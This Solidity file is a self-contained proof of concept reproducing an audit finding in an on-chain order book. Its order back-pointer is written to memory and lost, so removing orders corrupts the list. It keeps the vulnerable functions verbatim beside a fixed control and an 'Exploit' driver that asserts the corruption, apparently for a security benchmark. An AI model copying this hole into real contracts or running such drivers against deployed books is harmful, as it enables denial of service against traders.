// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of GTE CLOB finding 64869:
// "Order double-linked list is broken because order.prevOrderId is not persisted".
//
// Real source: github.com/code-423n4/2025-07-gte-clob @ commit
//   9f06332ebd4cfe2577d9eae81aeb58d3662ffccd  (contracts/clob/types/Book.sol,
//   contracts/clob/types/Order.sol) — the audited (pre-fix) state.
//
// Orders live in a per-limit doubly-linked list inside the book. On insert,
// `_updateLimitPostOrder` receives the new order as `Order memory` and writes
// its back-pointer with `order.prevOrderId = tailOrder.id;`. Because `order` is
// a MEMORY copy (the storage copy was already written by `_updateBookPostOrder`
// BEFORE this call), that back-pointer is never persisted: every order's
// `prevOrderId` stays null in storage. When the tail order is later removed,
// `_updateLimitRemoveOrder` reads the null `prevOrderId`, takes the wrong
// branch, and forces `limit.tailOrder = null` even though a live order still
// occupies the limit — corrupting the list and DoS-ing add/remove on that limit.
//
// The vulnerable functions `_updateLimitPostOrder` and `_updateLimitRemoveOrder`
// are inlined VERBATIM. The only reduction is the opaque book bookkeeping
// (RedBlackTree ordering + open-interest metadata) in `_updateBookPostOrder` /
// `_updateBookRemoveOrder`, which is out of scope for a pure memory-vs-storage
// persistence defect; the load-bearing invariant — the order is written to
// storage BEFORE the buggy mutation — is preserved verbatim.
// ─────────────────────────────────────────────────────────────────────────────

// ── Inlined VERBATIM from contracts/clob/types/Order.sol ─────────────────────
type OrderId is uint256;

using OrderIdLib for OrderId global;

library OrderIdLib {
    function getOrderId(address account, uint96 id) internal pure returns (uint256) {
        return uint256(bytes32(abi.encodePacked(account, id)));
    }

    function toOrderId(uint256 id) internal pure returns (OrderId) {
        return OrderId.wrap(id);
    }

    function unwrap(OrderId id) internal pure returns (uint256) {
        return uint256(OrderId.unwrap(id));
    }

    function isNull(OrderId id) internal pure returns (bool) {
        return id.unwrap() == NULL_ORDER_ID;
    }
}

uint256 constant NULL_ORDER_ID = 0;
uint32 constant NULL_TIMESTAMP = 0;

enum Side {
    BUY,
    SELL
}

struct Order {
    // SLOT 0 //
    Side side;
    uint32 cancelTimestamp;
    OrderId id;
    OrderId prevOrderId;
    OrderId nextOrderId;
    // SLOT 1 //
    address owner;
    // SLOT 2 //
    uint256 price;
    // SLOT 3 //
    uint256 amount; // denominated in base for limit & either token for fill
}

using OrderLib for Order global;

library OrderLib {
    using OrderIdLib for uint256;

    /// @dev sig: 0xd36d8965
    error OrderNotFound();

    /// @dev Checks whether an order is null
    function isNull(Order storage self) internal view returns (bool) {
        return self.id.unwrap() == NULL_ORDER_ID;
    }

    /// @dev Asserts that an order exists
    function assertExists(Order storage self) internal view {
        if (self.isNull()) revert OrderNotFound();
    }
}

// ── Inlined VERBATIM from contracts/clob/types/Book.sol (struct defs) ────────
struct Limit {
    uint64 numOrders;
    OrderId headOrder;
    OrderId tailOrder;
}

struct Book {
    // NOTE: the real Book also holds `RedBlackTree bidTree/askTree`; those
    // maintain price ordering and are irrelevant to the linked-list back-pointer
    // persistence bug, so they are omitted from this reduction.
    mapping(OrderId => Order) orders;
    mapping(uint256 price => Limit) bidLimits;
    mapping(uint256 price => Limit) askLimits;
}

using BookLib for Book global;

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE library — `_updateLimitPostOrder` and `_updateLimitRemoveOrder`
// are byte-for-byte the audited functions.
// ─────────────────────────────────────────────────────────────────────────────
library BookLib {
    using OrderIdLib for uint256;

    event LimitOrderCreated(
        uint256 indexed eventNonce, OrderId indexed orderId, uint256 price, uint256 amount, Side side
    );

    /// @dev Adds a limit order to the book  [VERBATIM Book.sol L150-154]
    function addOrderToBook(Book storage self, Order memory order) internal {
        Limit storage limit = _updateBookPostOrder(self, order);

        _updateLimitPostOrder(self, limit, order);
    }

    /// @dev Removes an order from the book  [VERBATIM Book.sol L157-160]
    function removeOrderFromBook(Book storage self, Order storage order) internal {
        _updateLimitRemoveOrder(self, order);
        _updateBookRemoveOrder(self, order);
    }

    /// @dev REDUCED boundary of Book.sol L256-270: keeps ONLY the load-bearing
    ///      side effect — the order is written to STORAGE here, BEFORE
    ///      `_updateLimitPostOrder` runs. The tree.insert + open-interest
    ///      metadata are the omitted opaque bookkeeping.
    function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {
        if (order.side == Side.BUY) {
            limit = self.bidLimits[order.price];
        } else {
            limit = self.askLimits[order.price];
        }

        self.orders[order.id] = order; // stores the memory order (prevOrderId still null)
    }

    /// @dev [VERBATIM Book.sol L272-286]
    function _updateLimitPostOrder(Book storage self, Limit storage limit, Order memory order) private {
        limit.numOrders++;

        if (limit.headOrder.isNull()) {
            limit.headOrder = order.id;
            limit.tailOrder = order.id;
        } else {
            Order storage tailOrder = self.orders[limit.tailOrder];
            tailOrder.nextOrderId = order.id;
            order.prevOrderId = tailOrder.id; // @> written to the MEMORY copy of `order`; never persisted to self.orders[order.id]
            limit.tailOrder = order.id;
        }

        emit LimitOrderCreated(0, order.id, order.price, order.amount, order.side);
    }

    /// @dev REDUCED boundary of Book.sol L288-300: keeps ONLY the storage delete
    ///      (open-interest metadata omitted). Runs AFTER `_updateLimitRemoveOrder`.
    function _updateBookRemoveOrder(Book storage self, Order storage order) private {
        delete self.orders[order.id];
    }

    /// @dev [VERBATIM Book.sol L302-328] (tree.remove in the numOrders==1 branch
    ///      is the only omitted opaque call)
    function _updateLimitRemoveOrder(Book storage self, Order storage order) private {
        uint256 price = order.price;

        Limit storage limit = order.side == Side.BUY ? self.bidLimits[price] : self.askLimits[price];

        if (limit.numOrders == 1) {
            if (order.side == Side.BUY) {
                delete self.bidLimits[price];
            } else {
                delete self.askLimits[price];
            }
            return;
        }

        limit.numOrders--;

        OrderId prev = order.prevOrderId;
        OrderId next = order.nextOrderId;

        if (!prev.isNull()) self.orders[prev].nextOrderId = next;
        else limit.headOrder = next;

        if (!next.isNull()) self.orders[next].prevOrderId = prev;
        else limit.tailOrder = prev;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED library (negative control) — `addOrderToBook` passes the STORAGE order
// to `_updateLimitPostOrder`, so `order.prevOrderId = tailOrder.id;` persists.
// ─────────────────────────────────────────────────────────────────────────────
library BookLibFixed {
    using OrderIdLib for uint256;

    function addOrderToBook(Book storage self, Order memory order) internal {
        Limit storage limit = _updateBookPostOrder(self, order);

        // FIX: hand the already-stored STORAGE order to the linker so the
        // back-pointer write below lands in storage.
        _updateLimitPostOrder(self, limit, self.orders[order.id]);
    }

    function removeOrderFromBook(Book storage self, Order storage order) internal {
        _updateLimitRemoveOrder(self, order);
        _updateBookRemoveOrder(self, order);
    }

    function _updateBookPostOrder(Book storage self, Order memory order) private returns (Limit storage limit) {
        if (order.side == Side.BUY) {
            limit = self.bidLimits[order.price];
        } else {
            limit = self.askLimits[order.price];
        }

        self.orders[order.id] = order;
    }

    function _updateLimitPostOrder(Book storage self, Limit storage limit, Order storage order) private {
        limit.numOrders++;

        if (limit.headOrder.isNull()) {
            limit.headOrder = order.id;
            limit.tailOrder = order.id;
        } else {
            Order storage tailOrder = self.orders[limit.tailOrder];
            tailOrder.nextOrderId = order.id;
            order.prevOrderId = tailOrder.id; // STORAGE write — persisted (the fix)
            limit.tailOrder = order.id;
        }
    }

    function _updateBookRemoveOrder(Book storage self, Order storage order) private {
        delete self.orders[order.id];
    }

    function _updateLimitRemoveOrder(Book storage self, Order storage order) private {
        uint256 price = order.price;

        Limit storage limit = order.side == Side.BUY ? self.bidLimits[price] : self.askLimits[price];

        if (limit.numOrders == 1) {
            if (order.side == Side.BUY) {
                delete self.bidLimits[price];
            } else {
                delete self.askLimits[price];
            }
            return;
        }

        limit.numOrders--;

        OrderId prev = order.prevOrderId;
        OrderId next = order.nextOrderId;

        if (!prev.isNull()) self.orders[prev].nextOrderId = next;
        else limit.headOrder = next;

        if (!next.isNull()) self.orders[next].prevOrderId = prev;
        else limit.tailOrder = prev;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Thin wrappers that own a `Book` in storage and expose the buggy / fixed paths.
// ─────────────────────────────────────────────────────────────────────────────
contract BookVuln {
    Book internal book;

    function addSell(uint256 id, uint256 price, uint256 amount, address owner) external {
        Order memory order;
        order.side = Side.SELL;
        order.id = OrderId.wrap(id);
        order.owner = owner;
        order.price = price;
        order.amount = amount;
        book.addOrderToBook(order);
    }

    function removeSell(uint256 id) external {
        book.removeOrderFromBook(book.orders[OrderId.wrap(id)]);
    }

    function getPrevOrderId(uint256 id) external view returns (uint256) {
        return book.orders[OrderId.wrap(id)].prevOrderId.unwrap();
    }

    function getNextOrderId(uint256 id) external view returns (uint256) {
        return book.orders[OrderId.wrap(id)].nextOrderId.unwrap();
    }

    function orderExists(uint256 id) external view returns (bool) {
        return book.orders[OrderId.wrap(id)].id.unwrap() != 0;
    }

    function getAskHead(uint256 price) external view returns (uint256) {
        return book.askLimits[price].headOrder.unwrap();
    }

    function getAskTail(uint256 price) external view returns (uint256) {
        return book.askLimits[price].tailOrder.unwrap();
    }

    function getAskNumOrders(uint256 price) external view returns (uint64) {
        return book.askLimits[price].numOrders;
    }
}

contract BookFixed {
    Book internal book;

    function addSell(uint256 id, uint256 price, uint256 amount, address owner) external {
        Order memory order;
        order.side = Side.SELL;
        order.id = OrderId.wrap(id);
        order.owner = owner;
        order.price = price;
        order.amount = amount;
        BookLibFixed.addOrderToBook(book, order);
    }

    function removeSell(uint256 id) external {
        BookLibFixed.removeOrderFromBook(book, book.orders[OrderId.wrap(id)]);
    }

    function getPrevOrderId(uint256 id) external view returns (uint256) {
        return book.orders[OrderId.wrap(id)].prevOrderId.unwrap();
    }

    function orderExists(uint256 id) external view returns (bool) {
        return book.orders[OrderId.wrap(id)].id.unwrap() != 0;
    }

    function getAskHead(uint256 price) external view returns (uint256) {
        return book.askLimits[price].headOrder.unwrap();
    }

    function getAskTail(uint256 price) external view returns (uint256) {
        return book.askLimits[price].tailOrder.unwrap();
    }
}

/// @dev Minimal ERC20 double used ONLY to record the DoS magnitude to the SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: place two orders at one limit; the second order's back-pointer
// is silently lost; removing the tail then corrupts the limit's head/tail to
// null while a live order still occupies it — the order book is DoS'd. The fixed
// variant persists the back-pointer and keeps the list consistent.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant MAKER = 0x000000000000000000000000000000000000bEEF;

    uint256 internal constant PRICE = 1000;
    uint256 internal constant AMOUNT = 100;

    // Exposed results (buggy vs fixed) for the driver's harm + negative-control asserts.
    uint256 public buggyPrevOf2; // storage back-pointer of order2 in the buggy book
    uint256 public fixedPrevOf2; // storage back-pointer of order2 in the fixed book
    uint256 public buggyHeadAfterRemove;
    uint256 public buggyTailAfterRemove;
    uint256 public fixedHeadAfterRemove;
    uint256 public fixedTailAfterRemove;
    bool public buggyOrder1Exists;
    bool public fixedOrder1Exists;
    uint64 public buggyNumOrdersAfterRemove;

    uint256 public sinkMarkerBalance;
    address public bookVulnAddr;
    address public bookFixedAddr;
    address public markerAddr;

    function run() external payable {
        // --- deploy in a fixed order (marker LAST) ---
        BookVuln bv = new BookVuln();     // nonce 1
        BookFixed bf = new BookFixed();   // nonce 2
        MiniToken marker = new MiniToken("Orphaned Order", "ORPHANED-ORDER"); // nonce 3 (LAST)

        bookVulnAddr = address(bv);
        bookFixedAddr = address(bf);
        markerAddr = address(marker);

        // ── BUGGY path ──────────────────────────────────────────────────────
        // Two SELL orders at the SAME limit price => one doubly-linked list.
        bv.addSell(1, PRICE, AMOUNT, MAKER);
        bv.addSell(2, PRICE, AMOUNT, MAKER);

        // Broken invariant A: order2 is the tail, so its prevOrderId should point
        // to order1 — but the write happened on a memory copy and was lost.
        buggyPrevOf2 = bv.getPrevOrderId(2); // == 0 (null); should be 1

        // DoS B: remove the tail order (order2). With a null prevOrderId the
        // removal takes the head/tail-reset branches and nulls BOTH pointers,
        // even though order1 is still a live order in the limit.
        bv.removeSell(2);
        buggyHeadAfterRemove = bv.getAskHead(PRICE); // == 0 (corrupted)
        buggyTailAfterRemove = bv.getAskTail(PRICE); // == 0 (corrupted)
        buggyNumOrdersAfterRemove = bv.getAskNumOrders(PRICE); // == 1 (claims 1 order…)
        buggyOrder1Exists = bv.orderExists(1); // …but order1 is orphaned & unreachable

        // ── FIXED path (negative control) ──────────────────────────────────
        bf.addSell(1, PRICE, AMOUNT, MAKER);
        bf.addSell(2, PRICE, AMOUNT, MAKER);
        fixedPrevOf2 = bf.getPrevOrderId(2); // == 1 (persisted)
        bf.removeSell(2);
        fixedHeadAfterRemove = bf.getAskHead(PRICE); // == 1 (intact)
        fixedTailAfterRemove = bf.getAskTail(PRICE); // == 1 (correct fallback to order1)
        fixedOrder1Exists = bf.orderExists(1);

        // ── harm holds: buggy list corrupted, fixed list consistent ──────────
        require(buggyPrevOf2 == 0, "A: buggy back-pointer must be null");
        require(fixedPrevOf2 == 1, "control: fixed back-pointer must persist");
        require(buggyHeadAfterRemove == 0 && buggyTailAfterRemove == 0, "B: buggy limit must be corrupted to null");
        require(buggyNumOrdersAfterRemove == 1 && buggyOrder1Exists, "B: order1 must remain, orphaned");
        require(fixedHeadAfterRemove == 1 && fixedTailAfterRemove == 1, "control: fixed limit must point to order1");

        // Record the DoS magnitude (1 live order orphaned in a corrupted limit).
        marker.mint(SINK, 1);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
